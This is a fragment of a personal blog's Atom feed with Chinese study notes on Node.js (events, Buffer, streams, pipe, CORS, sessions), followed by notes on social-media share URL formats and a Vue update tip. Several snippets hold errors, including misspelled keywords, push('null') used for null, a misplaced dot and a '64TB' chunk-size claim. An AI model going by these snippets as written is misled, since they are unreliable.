class="keyword">this</span>===global)<span class="comment">//true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pet</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.word=<span class="string">"miaomiao';</span></span><br><span class="line"><span class="string">    this.speak = function()&#123;</span></span><br><span class="line"><span class="string">        console.log(this)//cat</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var cat =new pet();</span></span><br></pre></td></tr></table></figure><p>this通常指向当前函数的拥有者，叫做执行上下文</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Pet</span>(<span class="params">word</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.word = word;</span><br><span class="line">    <span class="keyword">this</span>.speak = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.word);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params">word</span>)</span>&#123;</span><br><span class="line">    Pet.call(<span class="keyword">this</span>,word);<span class="comment">//Pet的this指向当前的Dog,相当于继承</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> Dog(<span class="string">'wang'</span>);</span><br><span class="line">dog.speak()</span><br></pre></td></tr></table></figure><h3 id="cheerio"><a href="#cheerio" class="headerlink" title="cheerio"></a>cheerio</h3><p>cheerio可以像jquery一样，解析html代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $ = cheerio.load(html);</span><br><span class="line"><span class="keyword">var</span> chapters = $(<span class="string">'.learnchapter'</span>);</span><br><span class="line">chapters.each(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> c =$(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">var</span> chapterTitle = c.find(<span class="string">'strong'</span>).text();</span><br><span class="line">    <span class="keyword">var</span> vedio = c.find(<span class="string">'.vedio'</span>).children(<span class="string">'li'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="events模块"><a href="#events模块" class="headerlink" title="events模块"></a>events模块</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventEmitter =<span class="built_in">require</span>(<span class="string">'events'</span>).EventEmitter;</span><br><span class="line"><span class="keyword">var</span> life = <span class="keyword">new</span> EventEmitter();</span><br><span class="line"></span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">1</span>)&#125;);</span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">2</span>)&#125;);</span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">3</span>)&#125;);</span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">4</span>)&#125;);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> haseventname = life.emit(eventname,args)<span class="comment">//返回有没有监听过</span></span><br><span class="line"></span><br><span class="line">life.removeListener(eventname,functionname)<span class="comment">//移除</span></span><br><span class="line">life.removeAllListener(eventname)<span class="comment">//批量移除</span></span><br><span class="line"></span><br><span class="line">life.listeners(eventname)<span class="comment">//所有监听器</span></span><br><span class="line"></span><br><span class="line">EventEmitter.listenerCount(life,eventname)</span><br></pre></td></tr></table></figure><p>默认一个事件不要超过10个监听器，不然内容泄露.可以进行设置<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">life.setMaxListeners(<span class="number">0</span>)<span class="comment">//去掉限制</span></span><br><span class="line">life.setMaxListeners(<span class="number">11</span>)<span class="comment">//最多11个</span></span><br></pre></td></tr></table></figure></p><h3 id="Buffer暂存"><a href="#Buffer暂存" class="headerlink" title="Buffer暂存"></a>Buffer暂存</h3><p>Buffer 二进制数据。因为JS的字符串是utf-8存储的，处理二进制的能力弱。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer([<span class="number">1</span>,<span class="number">2.11</span>,<span class="number">3.22</span>,<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(buf[<span class="number">1</span>])<span class="comment">//2</span></span><br></pre></td></tr></table></figure></p><h5 id="转换图片为base64"><a href="#转换图片为base64" class="headerlink" title="转换图片为base64"></a>转换图片为base64</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.readFile(<span class="string">'logo.png'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,origin_buff</span>)</span>&#123;</span><br><span class="line">    fs.writeFile(<span class="string">'logo_buffer.png'</span>.origin_buff,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">var</span> base64Img=origin_buff.toString(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">var</span> decodedImg = <span class="keyword">new</span> Buffer(base64Img ,<span class="string">'base64'</span>)<span class="comment">//拼装成data:image/png,base64,decodedImg才可使用</span></span><br><span class="line">    <span class="built_in">console</span>.log(Buffer.compare(origin_buff,decodedImg))<span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Stream-边读边写"><a href="#Stream-边读边写" class="headerlink" title="Stream 边读边写"></a>Stream 边读边写</h3><h5 id="转换图片为base64-1"><a href="#转换图片为base64-1" class="headerlink" title="转换图片为base64"></a>转换图片为base64</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//stream_logo.js</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.writeFileSync(<span class="string">'stream_logo.png'</span>,fs.readFileSync(<span class="string">'logo.png'</span>));<span class="comment">//大文件会爆仓</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> readStream = fs.createReadStream(<span class="string">'stream_logo.js'</span>)</span><br><span class="line">readStream</span><br><span class="line">.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">    n++</span><br><span class="line">    <span class="built_in">console</span>.log(Buffer.isBuffer(chunk));<span class="comment">//true 一次大概64TB</span></span><br><span class="line">    <span class="built_in">console</span>.log(chunk.toString(<span class="string">'utf8'</span>));<span class="comment">//stream_logo.js内容</span></span><br><span class="line">    readStream.pause();</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        readStream.resume()</span><br><span class="line">    &#125;,<span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.on(<span class="string">'readable'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(n)&#125;)</span><br><span class="line">.on(<span class="string">'close'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br></pre></td></tr></table></figure><h5 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> readStream = fs.createReadStream(<span class="string">'1.mp4'</span>);</span><br><span class="line"><span class="keyword">var</span> writeStream = fs.createWriteStream(<span class="string">'copy.mp4'</span>);</span><br><span class="line">readStream.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(writeStream.write(chunk)===<span class="literal">false</span>)&#123;<span class="comment">//数据还在缓存区，读得快写得慢</span></span><br><span class="line">        readStream.pause();<span class="comment">//先暂停</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">writeStream.on(<span class="string">'drain'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;<span class="comment">//已经写完了</span></span><br><span class="line">    readStream.resume();  </span><br><span class="line">&#125;)</span><br><span class="line">readStream.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">    writeStream.end()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="强大的Pipe"><a href="#强大的Pipe" class="headerlink" title="强大的Pipe"></a>强大的Pipe</h5><p>Duplex双工<br>Transform双工，但是不存储数据<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// fs.readFile('logo.png',function(err,data)&#123;</span></span><br><span class="line">    <span class="comment">//     if(err)&#123;</span></span><br><span class="line">    <span class="comment">//         res.end('file is not exist!')</span></span><br><span class="line">    <span class="comment">//     &#125;else&#123;</span></span><br><span class="line">    <span class="comment">//         res.writeHead(200，&#123;‘Content-Type':'text/html'&#125;);</span></span><br><span class="line">    <span class="comment">//         res.end(data)</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;)</span></span><br><span class="line">    fs.createReadStream(<span class="string">'logo.png'</span>).pipe(res);<span class="comment">//返回给浏览器</span></span><br><span class="line">    request(<span class="string">'https://imoooc/logo.png'</span>).pipe(res)<span class="comment">//同上 边下载边pipe</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>上面的复制文件代码就可以改成<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.createReadStream(<span class="string">'1.mp4'</span>).pipe(fs.createWriteStream(<span class="string">'copy.mp4'</span>))</span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Readable = <span class="built_in">require</span>(<span class="string">'stream'</span>).Readable</span><br><span class="line"><span class="keyword">var</span> Writable = <span class="built_in">require</span>(<span class="string">'stream'</span>).Writable</span><br><span class="line"><span class="keyword">var</span> readStream = <span class="keyword">new</span> Readable()</span><br><span class="line"><span class="keyword">var</span> writeStream = <span class="keyword">new</span> Writable()</span><br><span class="line">readStream.push(<span class="string">'I'</span>)</span><br><span class="line">readStream.push(<span class="string">'Love'</span>)</span><br><span class="line">readStream.push(<span class="string">'You\n'</span>)</span><br><span class="line">readStream.push(<span class="string">'null'</span>)</span><br><span class="line">writeStream._write = <span class="function"><span class="keyword">function</span>(<span class="params">chunk,encode,cb</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(chunk.toString())</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line">readStream.pipe(writeStream)</span><br></pre></td></tr></table></figure><p>定制流<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">funcion ReadStream()&#123;</span><br><span class="line">    stream.Readable.call(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(ReadStream,stream.Readable);<span class="comment">//继承原型</span></span><br><span class="line">ReadStream.prototype._read=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'I'</span>)</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'Love'</span>)</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'You\n'</span>)</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'null'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">funcion WritStream()&#123;</span><br><span class="line">    stream.Writable.call(<span class="keyword">this</span>)</span><br><span class="line">    <span class="keyword">this</span>._cached=<span class="keyword">new</span> Buffer(<span class="string">''</span>)</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(WritStream,stream.Writable);</span><br><span class="line">WritStream.prototype._write = <span class="function"><span class="keyword">function</span>(<span class="params">chunk,encode,cb</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(chunk.toString())</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TransfromStream</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    stream.Transform.call(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(TransfromStream,stream.Transfrom);</span><br><span class="line">TransfromStream.prototype._transform= <span class="function"><span class="keyword">function</span>(<span class="params">chunk,encode,cb</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.push(chunk)</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line">TransfromStream.prototype.flush= <span class="function"><span class="keyword">function</span>(<span class="params">cb</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'On Yeah!'</span>)</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rs= <span class="keyword">new</span> ReadStream()</span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WritStream();</span><br><span class="line"><span class="keyword">var</span> ts = <span class="keyword">new</span> TransfromStream()</span><br><span class="line"></span><br><span class="line">rs.pipe(ts).pipe(ws)</span><br></pre></td></tr></table></figure></p><p>createReadStream是给你一个ReadableStream，你可以听它的’data’，一点一点儿处理文件，用过的部分会被GC（垃圾回收），所以占内存少。</p><p>readFile是把整个文件全部读到内存里，这种方式是把文件内容全部读入内存，然后再写入文件。对于小型的文本文件，这没有多大问题。但是对于体积较大的二进制文件，比如音频、视频文件，动辄几个GB大小，如果使用这种方法，很容易使内存<code>“爆仓”</code>。理想的方法应该是读一部分，写一部分，不管文件有多大，只要时间允许，总会处理完成，这里就需要用到流的概念</p><p>node不适合的：<br>极高并发数（电商）、<br>密集CPU运算（最优化路线）、<br>高安全高可靠性（银行）、<br>内存精密控制和释放</p><p>express中，req.param()方法是对params\body\query的封装，取值顺序是params-&gt;body-&gt;query。</p><p>非简单请求的CORS（跨域）请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。在你的post请求之前会发送一次OPTIONS请求<br><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a></p><p>服务端重启会清除session.session持久化方法：cookies,redis,MongoDB,硬盘内存<br>为了弥补HTTP的无状态，就有了cookies和session.之前没有seesion的时候都用的是cookies.<br>当程序需要给某个客户端请求创建一个session时，服务器会检查请求里面是否包含sessionid,服务器把这个session找出来就行了。没有就创建，返回sessionid给客户端保存.<br><a href="https://www.jianshu.com/p/8f4cc45d712e" target="_blank" rel="noopener">koa-session</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;《深入浅出node-js》&quot;&gt;&lt;a href=&quot;#《深入浅出node-js》&quot; class=&quot;headerlink&quot; title=&quot;《深入浅出node.js》&quot;&gt;&lt;/a&gt;《深入浅出node.js》&lt;/h1&gt;&lt;p&gt;适合高并发、IO密集型、事件驱动&lt;/p&gt;
&lt;ul&gt;

      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="读书笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>2018-7至2018-9总结</title>
    <link href="http://lry1994.github.io/study/2018/7/zongjie.html"/>
    <id>http://lry1994.github.io/study/2018/7/zongjie.html</id>
    <published>2018-07-03T16:00:00.000Z</published>
    <updated>2018-09-25T08:50:07.147Z</updated>
    
    <content type="html"><![CDATA[<h3 id="社交分享接口"><a href="#社交分享接口" class="headerlink" title="社交分享接口"></a>社交分享接口</h3><p>qzone       : ‘<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=" target="_blank" rel="noopener">http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=</a>&amp;title=&amp;desc=&amp;summary=&amp;site=‘,<br>qq          : ‘<a href="http://connect.qq.com/widget/shareqq/index.html?url=" target="_blank" rel="noopener">http://connect.qq.com/widget/shareqq/index.html?url=</a>&amp;title=&amp;source=&amp;desc=&amp;pics=‘,<br>tencent     : ‘<a href="http://share.v.t.qq.com/index.php?c=share&amp;a=index&amp;title=" target="_blank" rel="noopener">http://share.v.t.qq.com/index.php?c=share&amp;a=index&amp;title=</a>&amp;url=&amp;pic=‘,<br>weibo       : ‘<a href="https://service.weibo.com/share/share.php?url=" target="_blank" rel="noopener">https://service.weibo.com/share/share.php?url=</a>&amp;title=&amp;pic=&amp;appkey=‘,</p><p>douban      : ‘<a href="http://shuo.douban.com/!service/share?href=" target="_blank" rel="noopener">http://shuo.douban.com/!service/share?href=</a>&amp;name=&amp;text=&amp;image=&amp;starid=0&amp;aid=0&amp;style=11’,<br>diandian    : ‘<a href="http://www.diandian.com/share?lo=" target="_blank" rel="noopener">http://www.diandian.com/share?lo=</a>&amp;ti=&amp;type=link’,<br>linkedin    : ‘<a href="http://www.linkedin.com/shareArticle?mini=true&amp;ro=true&amp;title=" target="_blank" rel="noopener">http://www.linkedin.com/shareArticle?mini=true&amp;ro=true&amp;title=</a>&amp;url=&amp;summary=&amp;source=&amp;armin=armin’,<br>facebook    : ‘<a href="https://www.facebook.com/sharer/sharer.php?u=" target="_blank" rel="noopener">https://www.facebook.com/sharer/sharer.php?u=</a>&amp;title=&amp;description=&amp;caption=&amp;link=&amp;picture=‘,<br>twitter     : ‘<a href="https://twitter.com/intent/tweet?text=" target="_blank" rel="noopener">https://twitter.com/intent/tweet?text=</a>&amp;url=&amp;via=‘,<br>google      : ‘<a href="https://plus.google.com/share?url=" target="_blank" rel="noopener">https://plus.google.com/share?url=</a>‘</p><h5 id="微博"><a href="#微博" class="headerlink" title="微博"></a>微博</h5><p><a href="http://service.weibo.com/share/share.php" target="_blank" rel="noopener">http://service.weibo.com/share/share.php</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=</span><br><span class="line">&amp;title=</span><br><span class="line">&amp;pic=可为空</span><br><span class="line">&amp;appkey=可为空</span><br></pre></td></tr></table></figure></p><h5 id="发送给QQ好友"><a href="#发送给QQ好友" class="headerlink" title="发送给QQ好友"></a>发送给QQ好友</h5><p><a href="http://connect.qq.com/widget/shareqq/index.html" target="_blank" rel="noopener">http://connect.qq.com/widget/shareqq/index.html</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=</span><br><span class="line">title=</span><br><span class="line">source= 默认读取head标签的site：&lt;meta name=&quot;site&quot; content=&quot;http://overtrue&quot; /&gt;</span><br><span class="line">desc=默认读取head标签的description：&lt;meta name=&quot;description&quot; content=&quot;http://overtrue&quot; /&gt;</span><br><span class="line">pics=</span><br></pre></td></tr></table></figure></p><h5 id="腾讯微博"><a href="#腾讯微博" class="headerlink" title="腾讯微博"></a>腾讯微博</h5><p><a href="http://share.v.t.qq.com/index.php" target="_blank" rel="noopener">http://share.v.t.qq.com/index.php</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=share</span><br><span class="line">a=index</span><br><span class="line">title=</span><br><span class="line">url=</span><br><span class="line">pic=</span><br></pre></td></tr></table></figure></p><h5 id="豆瓣"><a href="#豆瓣" class="headerlink" title="豆瓣"></a>豆瓣</h5><p><a href="https://www.douban.com/share/service" target="_blank" rel="noopener">https://www.douban.com/share/service</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">href=</span><br><span class="line">&amp;name=</span><br><span class="line">&amp;text=</span><br></pre></td></tr></table></figure></p><h5 id="豆瓣-1"><a href="#豆瓣-1" class="headerlink" title="豆瓣"></a>豆瓣</h5><p><a href="http://shuo.douban.com/!service/share" target="_blank" rel="noopener">http://shuo.douban.com/!service/share</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">href=</span><br><span class="line">name=</span><br><span class="line">text=</span><br><span class="line">image=</span><br><span class="line">starid=0</span><br><span class="line">aid=0</span><br><span class="line">style=11</span><br></pre></td></tr></table></figure></p><h5 id="QQ空间-这个好像腾讯坏了，都是undefined"><a href="#QQ空间-这个好像腾讯坏了，都是undefined" class="headerlink" title="QQ空间(这个好像腾讯坏了，都是undefined)"></a>QQ空间(这个好像腾讯坏了，都是undefined)</h5><p><a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey" target="_blank" rel="noopener">http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=</span><br><span class="line">desc=</span><br><span class="line">summary=</span><br><span class="line">site=</span><br></pre></td></tr></table></figure></p><h5 id="linkin"><a href="#linkin" class="headerlink" title="linkin"></a>linkin</h5><p><a href="http://www.linkedin.com/shareArticle" target="_blank" rel="noopener">http://www.linkedin.com/shareArticle</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mini=true</span><br><span class="line">ro=true</span><br><span class="line">title=</span><br><span class="line">url=</span><br><span class="line">summary=</span><br><span class="line">source=</span><br><span class="line">armin=armin</span><br></pre></td></tr></table></figure></p><h5 id="点点（不知道是什么东西）"><a href="#点点（不知道是什么东西）" class="headerlink" title="点点（不知道是什么东西）"></a>点点（不知道是什么东西）</h5><p><a href="http://www.diandian.com/share" target="_blank" rel="noopener">http://www.diandian.com/share</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lo= 文章链接</span><br><span class="line">ti= 文章标题</span><br><span class="line">type=link</span><br></pre></td></tr></table></figure></p><h5 id="facebook"><a href="#facebook" class="headerlink" title="facebook"></a>facebook</h5><p><a href="https://www.facebook.com/sharer/sharer.php" target="_blank" rel="noopener">https://www.facebook.com/sharer/sharer.php</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u= 文章链接</span><br></pre></td></tr></table></figure></p><h5 id="twitter"><a href="#twitter" class="headerlink" title="twitter"></a>twitter</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://twitter.com/intent/tweet?</span><br><span class="line">text= 文章标题</span><br><span class="line">url=</span><br><span class="line">via= 好像是域名</span><br></pre></td></tr></table></figure><h5 id="google"><a href="#google" class="headerlink" title="google"></a>google</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://plus.google.com/share?</span><br><span class="line">url=</span><br></pre></td></tr></table></figure><h3 id="vue强制更新"><a href="#vue强制更新" class="headerlink" title="vue强制更新"></a>vue强制更新</h3><p>用vue.$set不行，watch不行，试试$forceUpdate。<br>还有一种办法，再把值重新复制一遍也是可以的<br><code>this.obj = Object.assign({},this.obj)</code></p><h3 id="在Vue中使用sass及sass图片路径问题"><a href="#在Vue中使用sass及sass图片路径问题" class="headerlink" title="在Vue中使用sass及sass图片路径问题"></a>在Vue中使用sass及sass图片路径问题</h3><p><a href="https://www.jianshu.com/p/5e81814f8d8c" target="_blank" rel="noopener">https://www.jianshu.com/p/5e81814f8d8c</a></p><h3 id="CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为-或者和当前域名一致的话，才会进入第二段的真正请求。"><a href="#CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为-或者和当前域名一致的话，才会进入第二段的真正请求。" class="headerlink" 